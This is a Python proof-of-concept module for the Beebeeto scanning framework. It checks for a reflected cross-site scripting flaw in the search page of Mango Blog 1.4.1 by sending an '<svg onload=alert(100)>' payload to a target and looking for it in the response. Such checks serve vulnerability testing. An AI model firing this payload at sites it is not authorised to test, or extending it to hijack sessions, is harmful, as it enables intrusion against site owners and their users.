#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0056',
            'name': 'Mango Blog 1.4.1 /archives.cfm/search XSS跨站脚本漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-10-08',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'MangoBlog',
            'vul_version': ['1.4.1'],
            'type': 'Cross Site Scripting',
            'tag': ['Mango Blog漏洞', 'XSS漏洞', '/archives.cfm/search'],
            'desc': '''
                    Mango Blog没有正确地过滤提交给archives.cfm/search页面的term参数便返回给了用户，
                    远程攻击者可以通过提交恶意参数请求执行跨站脚本攻击，导致在用户浏览器会话中执行任意HTML和脚本代码。
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-87080',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/archives.cfm/search/?term=%3Csvg%20onload=alert(100)%3E'
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if '<svg onload=alert(100)>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
